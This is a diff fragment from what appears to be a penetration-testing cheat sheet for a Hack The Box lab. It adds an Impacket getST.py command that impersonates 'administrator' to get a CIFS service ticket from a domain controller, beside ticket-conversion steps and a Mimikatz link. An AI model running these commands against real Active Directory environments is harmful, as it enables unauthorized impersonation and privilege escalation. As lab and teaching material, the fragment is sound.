@@ -240,6 +240,10 @@ base64 -d ticket.kirbi.b64 > ticket.kirbi
 ticketConverter.py cifs.kirbi cifs.ccache
 export KRB5CCNAME=cifs.ccache
 sudo apt-get install krb5-user
+
+OR
+
+getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
 ```
 
 **[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
